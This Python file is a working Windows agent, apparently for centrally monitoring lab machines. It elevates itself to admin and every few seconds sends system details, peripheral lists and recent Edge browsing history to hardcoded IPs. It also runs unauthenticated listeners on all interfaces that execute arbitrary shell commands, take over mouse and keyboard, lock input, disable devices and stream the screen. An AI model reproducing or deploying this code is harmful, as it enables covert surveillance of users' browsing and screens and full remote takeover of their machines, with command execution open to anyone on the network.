import os
import sys
import time
import json
import socket
import sqlite3
import shutil
import platform
import subprocess
import threading
import io
import base64
import ctypes
import keyboard  
import mouse  
import tkinter as tk
import queue

ui_queue = queue.Queue()

DASHBOARD_IPS = ["192.168.1.4","172.65.21.7", "172.65.21.90", "172.65.21.1","172.65.21.45"]
TELEMETRY_PORT = 5005
LISTEN_COMMAND_PORT = 6006
STREAM_SERVER_PORT = 7007      
CHAT_STREAM_PORT = 8008

EDGE_HISTORY_DIR = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default")
EDGE_HISTORY_FILE = os.path.join(EDGE_HISTORY_DIR, "History")

hardware_lock_state = {
    "Keyboard": False,
    "Printer": {},
    "PnpDevices": {}
}


active_chat_room = {
    "peers": [],
    "ui_instance": None,
    "text_area": None
}

mouse_hook_instance = None

def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin()
    except: return False

def fetch_system_specs():
    try:
        cmd_ram = 'powershell -ExecutionPolicy Bypass -NoProfile -Command "(Get-CimInstance Win32_OperatingSystem).TotalVisibleMemorySize"'
        ram_raw = subprocess.check_output(cmd_ram, shell=True).decode().strip()
        ram_gb = round(int(ram_raw) / (1024**2))
    except:
        ram_gb = "Unknown"

    try:
        mac_cmd = 'getmac /fo csv /nh'
        mac_raw = subprocess.check_output(mac_cmd, shell=True).decode(errors="ignore").splitlines()

        mac_address = "N/A"

        for line in mac_raw:
            parts = line.replace('"', '').split(',')
            if len(parts) >= 1:
                candidate = parts[0].strip()
                if candidate and candidate != "N/A":
                    mac_address = candidate
                    break
    except:
        mac_address = "N/A"

    return {
        "hostname": socket.gethostname(),
        "os": f"{platform.system()} {platform.release()}",
        "cpu": platform.processor(),
        "ram": f"{ram_gb} GB RAM" if isinstance(ram_gb, int) else ram_gb,
        "mac": mac_address
    }

def gather_pnp_hardware_assets():
    devices = []
    target_classes = "'Mouse', 'Keyboard', 'Camera', 'Image', 'USB', 'DiskDrive/PenDrive', 'PrintQueue', 'Printer'"
    cmd_pnp = f'powershell -ExecutionPolicy Bypass -NoProfile -Command "Get-PnpDevice -PresentOnly | Where-Object {{$_.Class -in ({target_classes})}} | Select-Object FriendlyName, Class, InstanceId, Status | ConvertTo-Json -Compress"'
    try:
        out = subprocess.check_output(cmd_pnp, shell=True).decode('utf-8', errors='ignore').strip()
        if out:
            data = json.loads(out)
            if isinstance(data, dict): data = [data]
            for item in data:
                name = item.get("FriendlyName", "")
                if "root" in name.lower() or "controller" in name.lower() or "hub" in name.lower(): continue
                item_class = item.get("Class", "Peripheral")
                instance_id = item.get("InstanceId", "")
                
                # Dynamic validation logic across state registries
                if item_class == "Keyboard" and hardware_lock_state["Keyboard"]: 
                    display_status = "BLOCKED"
                elif item_class in ["PrintQueue", "Printer"] and hardware_lock_state["Printer"].get(name, False): 
                    display_status = "BLOCKED"
                elif hardware_lock_state["PnpDevices"].get(instance_id, False):
                    # Direct lookup tracking for standard PnP blocks
                    display_status = "BLOCKED"
                else:
                    raw_status = item.get("Status", "Unknown")
                    # Fallback validation verification mapping
                    if raw_status in ["Error", "Degraded", "Disabled"]:
                        display_status = "BLOCKED"
                    else:
                        display_status = "Active"
                
                # NOTE: Ensure key fits 'mfg' pattern mapping to match dashboard expectations
                devices.append({"name": name, "type": item_class, "status": display_status, "raw_id": instance_id})
    except: pass
    return devices

def gather_browsing_history():
    logs = []
    if not os.path.exists(EDGE_HISTORY_FILE): return logs
    temp_db = "edge_hist_temp.db"
    try:
        shutil.copy2(EDGE_HISTORY_FILE, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT url, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 35")
        for row in cursor.fetchall():
            try: converted_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime((row[1] / 1000000) - 11644473600))
            except: converted_time = "Recent Visit"
            logs.append({"site": row[0], "ip": converted_time})
        conn.close()
    except: pass
    if os.path.exists(temp_db):
        try: os.remove(temp_db)
        except: pass
    return logs

def package_and_transmit_telemetry():
    payload = fetch_system_specs()
    payload["devices"] = gather_pnp_hardware_assets()
    payload["history"] = gather_browsing_history()
    data_bytes = json.dumps(payload).encode('utf-8')
    data_len = len(data_bytes)
    for host_ip in DASHBOARD_IPS:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(3.0)
                s.connect((host_ip, TELEMETRY_PORT))
                s.sendall(data_len.to_bytes(4, byteorder='big'))
                s.sendall(data_bytes)
        except: pass

def cyclic_heartbeat_loop():
    while True:
        # Spawn the telemetry package in a separate thread so the 6-second 
        # sleep interval is strictly enforced without waiting for local execution.
        threading.Thread(target=package_and_transmit_telemetry, daemon=True).start()
        time.sleep(6)

def enforce_system_lock():
    global mouse_hook_instance
    keyboard.hook(lambda e: False, suppress=True)
    if mouse_hook_instance is None: mouse_hook_instance = mouse.hook(lambda e: False)

def release_system_lock():
    global mouse_hook_instance
    try: keyboard.unhook_all()
    except: pass
    if mouse_hook_instance is not None:
        try: mouse.unhook(mouse_hook_instance)
        except: pass
        mouse_hook_instance = None

def process_administrative_enforcement(client_socket):
    import pyautogui
    pyautogui.FAILSAFE = False
    try:
        len_bytes = b""
        while len(len_bytes) < 4:
            chunk = client_socket.recv(4 - len(len_bytes))
            if not chunk: return
            len_bytes += chunk
        target_payload_size = int.from_bytes(len_bytes, byteorder='big')
        buffer = b""
        while len(buffer) < target_payload_size:
            chunk = client_socket.recv(min(target_payload_size - len(buffer), 65536))
            if not chunk: break
            buffer += chunk
        if len(buffer) < target_payload_size: return 
        
        directive = json.loads(buffer.decode('utf-8'))
        action = directive.get("action")
        screen_width, screen_height = pyautogui.size()

        if action == "mouse_move":
            target_x = int(directive.get("x", 0) * screen_width)
            target_y = int(directive.get("y", 0) * screen_height)
            pyautogui.moveTo(target_x, target_y)
            return
        elif action == "mouse_click":
            target_x = int(directive.get("x", 0) * screen_width)
            target_y = int(directive.get("y", 0) * screen_height)
            btn = directive.get("button", "left")
            state = directive.get("state", "down")
            pyautogui.moveTo(target_x, target_y)
            if state == "down": pyautogui.mouseDown(button=btn)
            else: pyautogui.mouseUp(button=btn)
            return
        elif action == "key_input":
            raw_key = directive.get("key", "")
            if not raw_key: return
            key_map = {"Return": "enter", "BackSpace": "backspace", "Tab": "tab", "Escape": "escape", "Delete": "delete", "space": "space", "Up": "up", "Down": "down", "Left": "left", "Right": "right"}
            resolved_key = key_map.get(raw_key, raw_key.lower())
            try: pyautogui.press(resolved_key)
            except: pass
            return
        elif action == "lock_input":
            hardware_lock_state["Keyboard"] = True
            enforce_system_lock()
            package_and_transmit_telemetry()
            return
        elif action == "unlock_input":
            hardware_lock_state["Keyboard"] = False
            release_system_lock()
            package_and_transmit_telemetry()
            return
        elif action == "execute_installer":
            cmd_string = directive.get("command")
            subprocess.Popen(cmd_string, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return

        elif action == "send_notification":
            notif_title = directive.get("title", "SYSTEM NOTICE")
            notif_msg = directive.get("message", "")
            
            def spawn_custom_toast(title, message):
                import tkinter as tk
                toast_win = tk.Tk()
                toast_win.title(title)
                toast_win.attributes("-topmost", True)
                toast_win.configure(bg="#FFFFFF")
                toast_win.overrideredirect(True)
                
                sw = toast_win.winfo_screenwidth()
                sh = toast_win.winfo_screenheight()
                win_w, win_h = 360, 140
                pos_x = sw - win_w - 20
                pos_y = sh - win_h - 60
                toast_win.geometry(f"{win_w}x{win_h}+{pos_x}+{pos_y}")
                
                border_frame = tk.Frame(toast_win, bg="#CCCCCC", bd=1)
                border_frame.pack(fill=tk.BOTH, expand=True)
                
                inner_container = tk.Frame(border_frame, bg="#FFFFFF")
                inner_container.pack(fill=tk.BOTH, expand=True, padx=1, pady=1)
                
                btn_close = tk.Button(
                    inner_container, 
                    text="×", 
                    font=("Segoe UI", 14, "bold"), 
                    fg="#666666", 
                    bg="#FFFFFF", 
                    activebackground="#F3F3F3",
                    activeforeground="#000000",
                    bd=0, 
                    cursor="hand2",
                    command=toast_win.destroy
                )
                btn_close.place(x=325, y=5, width=25, height=25)
                
                lbl_title = tk.Label(
                    inner_container, 
                    text=title.upper(), 
                    font=("Segoe UI", 11, "bold"), 
                    fg="#000000", 
                    bg="#FFFFFF",
                    anchor="w"
                )
                lbl_title.pack(fill=tk.X, padx=(15, 40), pady=(12, 5))
                
                lbl_msg = tk.Label(
                    inner_container, 
                    text=message, 
                    font=("Segoe UI", 10), 
                    fg="#1A1A1A", 
                    bg="#FFFFFF",
                    anchor="nw", 
                    justify=tk.LEFT,
                    wraplength=320
                )
                lbl_msg.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 10))
                
                toast_win.mainloop()

            threading.Thread(target=spawn_custom_toast, args=(notif_title, notif_msg), daemon=True).start()
            return

        elif action == "setup_chat_room":
            room_peers = directive.get("peers", [])
            active_chat_room["peers"] = room_peers
            
            # CRITICAL FIX: Offload invocation straight to the primary thread queue pipeline
            ui_queue.put("LAUNCH_CHAT")
            return
        
        target_id = directive.get("raw_id")
        device_type = directive.get("device_type", "")
        device_name = directive.get("device_name", "")

        if target_id or device_name:
            if device_type.strip().lower() in ["printqueue", "printer"]:
                if action == "block_device":
                    hardware_lock_state["Printer"][device_name] = True
                    full_command = f'powershell -ExecutionPolicy Bypass -NoProfile -Command "Get-PrintJob -PrinterName \'{device_name}\' | Remove-PrintJob; Pause-Printer -Name \'{device_name}\'"'
                else:
                    hardware_lock_state["Printer"][device_name] = False
                    full_command = f'powershell -ExecutionPolicy Bypass -NoProfile -Command "Resume-Printer -Name \'{device_name}\'"'
                subprocess.run(full_command, shell=True, capture_output=True)
                package_and_transmit_telemetry()
                return

            if action == "block_device":
                hardware_lock_state["PnpDevices"][target_id] = True
            elif action == "unblock_device":
                hardware_lock_state["PnpDevices"][target_id] = False

            ps_action = "Enable-PnpDevice" if action == "unblock_device" else "Disable-PnpDevice"
            ps_script = f"{ps_action} -InstanceId '{target_id}' -Confirm:$false"
            full_command = f'powershell -ExecutionPolicy Bypass -NoProfile -Command "{ps_script}"'
            subprocess.run(full_command, shell=True, capture_output=True)
            package_and_transmit_telemetry()
            
    except Exception as e: pass
    finally:
        try: client_socket.close()
        except: pass

def command_listener_interface():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(('0.0.0.0', LISTEN_COMMAND_PORT))
        server.listen(10)
    except: return
    while True:
        try:
            sock, _ = server.accept()
            threading.Thread(target=process_administrative_enforcement, args=(sock,), daemon=True).start()
        except: pass

def screen_stream_listener_interface():
    import pyautogui
    pyautogui.FAILSAFE = False
    stream_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    stream_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        stream_server.bind(('0.0.0.0', STREAM_SERVER_PORT))
        stream_server.listen(2)
    except: return
    while True:
        try:
            conn, _ = stream_server.accept()
            def serve_screen_stream_worker(c):
                try:
                    while True:
                        screenshot = pyautogui.screenshot().convert("RGB")
                        img_byte_arr = io.BytesIO()
                        screenshot.save(img_byte_arr, format='JPEG', quality=45)
                        img_bytes = img_byte_arr.getvalue()
                        c.sendall(len(img_bytes).to_bytes(4, byteorder='big'))
                        c.sendall(img_bytes)
                        time.sleep(0.05)
                except: pass
                finally:
                    try: c.close()
                    except: pass
            threading.Thread(target=serve_screen_stream_worker, args=(conn,), daemon=True).start()
        except: pass

# ==========================================
# PASTE THESE ABOVE THE __main__ STATEMENT:
# ==========================================
def peer_chat_receiver_interface():
    """Listens continuously on port 8008 for inbound raw messages and displays them left-aligned."""
    chat_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    chat_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        chat_socket.bind(('0.0.0.0', CHAT_STREAM_PORT))
        chat_socket.listen(20)
    except: return

    while True:
        try:
            sock, _ = chat_socket.accept()
            data = sock.recv(4096).decode('utf-8')
            if data:
                payload = json.loads(data)
                sender = payload.get("sender", "Unknown Friend")
                msg_body = payload.get("message", "")
                
                if active_chat_room["ui_instance"] and active_chat_room["text_area"]:
                    active_chat_room["text_area"].config(state="normal")
                    # DISPLAY PEER MESSAGES ON THE LEFT SIDE USING THE TAG
                    active_chat_room["text_area"].insert(tk.END, f"[{sender}]: {msg_body}\n", "peer_msg")
                    active_chat_room["text_area"].config(state="disabled")
                    active_chat_room["text_area"].see(tk.END)
            sock.close()
        except: pass

def spawn_secure_chat_ui():
    """Generates a responsive windowed UI layout running directly on the primary thread execution context with split message alignment."""
    import tkinter as tk
    from tkinter import scrolledtext

    if active_chat_room["ui_instance"] is not None:
        return

    root_chat = tk.Tk()
    root_chat.title("SECURE LAN CHAT ROUTE")
    
    # Increased starting layout dimensions to keep elements readable initially
    root_chat.geometry("450x550")
    # Enforces absolute structural limits so users cannot resize the window smaller than standard visibility thresholds
    root_chat.minsize(400, 450)
    root_chat.configure(bg="#1A1B26")  
    root_chat.attributes("-topmost", True)
    
    active_chat_room["ui_instance"] = root_chat

    def on_close_cleanup():
        def alert_dashboard_exit():
            exit_packet = json.dumps({"action": "agent_exit_chat"})
            payload_bytes = exit_packet.encode('utf-8')
            payload_len = len(payload_bytes)
            for host_ip in DASHBOARD_IPS:
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(2.0)
                        s.connect((host_ip, TELEMETRY_PORT))
                        s.sendall(payload_len.to_bytes(4, byteorder='big'))
                        s.sendall(payload_bytes)
                except: pass

        threading.Thread(target=alert_dashboard_exit, daemon=True).start()
        active_chat_room["peers"] = []
        active_chat_room["ui_instance"] = None
        active_chat_room["text_area"] = None
        root_chat.destroy()

    root_chat.protocol("WM_DELETE_WINDOW", on_close_cleanup)

    lbl_title = tk.Label(
        root_chat, 
        text="// ACTIVE PEER LINK MATRIX", 
        font=("Consolas", 11, "bold"), 
        fg="#10B981", 
        bg="#1A1B26",
        anchor="w"
    )
    lbl_title.pack(fill=tk.X, padx=15, pady=(15, 5))

    # --- RESPONSIVE LAYOUT FRAME ---
    # Setting expand=True handles variable vertical scaling smoothly
    stream_frame = tk.Frame(root_chat, bg="#1A1B26")
    stream_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=5)

    txt_display = scrolledtext.ScrolledText(
        stream_frame, 
        wrap=tk.WORD, 
        state="disabled", 
        font=("Segoe UI", 10), 
        bg="#11121A", 
        fg="#E0E0E6", 
        bd=0,
        highlightthickness=1,
        highlightbackground="#2A2B36",
        highlightcolor="#10B981"
    )
    # Fills all allocated dynamic space inside the stream_frame container
    txt_display.pack(fill=tk.BOTH, expand=True)
    active_chat_room["text_area"] = txt_display

    txt_display.tag_configure("self_msg",justify="right",foreground="#10B981")

    txt_display.tag_configure("peer_msg",justify="left",foreground="#E0E0E6")

    # --- RESPONSIVE CONTROL PANEL FRAME ---
    # This keeps the control dock anchored firmly to the baseline without compressing
    input_frame = tk.Frame(root_chat, bg="#1A1B26")
    input_frame.pack(fill=tk.X, side=tk.BOTTOM, padx=15, pady=15)

    # Entry space expands horizontally automatically to fill variable workspace widths
    ent_message = tk.Entry(
        input_frame, 
        font=("Segoe UI", 11), 
        bg="#11121A", 
        fg="#FFFFFF", 
        insertbackground="#FFFFFF", 
        bd=0,
        highlightthickness=1,
        highlightbackground="#2A2B36",
        highlightcolor="#10B981"
    )
    ent_message.pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=8)

    def transmit_group_message():
        raw_txt = ent_message.get().strip()
        if not raw_txt: return
        
        my_hostname = socket.gethostname()
        msg_packet = json.dumps({"sender": my_hostname, "message": raw_txt})
        
        txt_display.config(state="normal")
        txt_display.insert(tk.END, f"[{my_hostname}]: {raw_txt}\n","self_msg")
        txt_display.config(state="disabled")
        txt_display.see(tk.END)
        
        ent_message.delete(0, tk.END)

        def worker():
            for peer_ip in active_chat_room["peers"]:
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(2.0)
                        s.connect((peer_ip, CHAT_STREAM_PORT))
                        s.sendall(msg_packet.encode('utf-8'))
                except: pass

        threading.Thread(target=worker, daemon=True).start()

    # Fixed button width with explicit internal padding ensures visibility regardless of text box context
    btn_send = tk.Button(
        input_frame, 
        text="SEND MESSAGE", 
        font=("Segoe UI", 9, "bold"), 
        fg="#FFFFFF", 
        bg="#10B981", 
        activebackground="#059669", 
        activeforeground="#FFFFFF",
        bd=0, 
        width=15, 
        cursor="hand2"
    )
    btn_send.pack(side=tk.RIGHT, padx=(10, 0), ipady=7)
    btn_send.config(command=transmit_group_message)
    
    ent_message.bind("<Return>", lambda e: transmit_group_message())

    root_chat.update_idletasks()
    root_chat.lift()
    root_chat.focus_force()

    root_chat.mainloop()


if __name__ == "__main__":
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()
    
    package_and_transmit_telemetry()
    threading.Thread(target=cyclic_heartbeat_loop, daemon=True).start()
    threading.Thread(target=command_listener_interface, daemon=True).start()
    threading.Thread(target=screen_stream_listener_interface, daemon=True).start()
    threading.Thread(target=peer_chat_receiver_interface, daemon=True).start()
    
    # --- SYNCHRONIZED MAIN THREAD TASK CONTROLLER ---
    while True:
        try:
            # Check for queued UI creation requests every 1 second
            task = ui_queue.get(timeout=1.0)
            if task == "LAUNCH_CHAT":
                spawn_secure_chat_ui()
        except queue.Empty:
            pass
        except KeyboardInterrupt:
            sys.exit()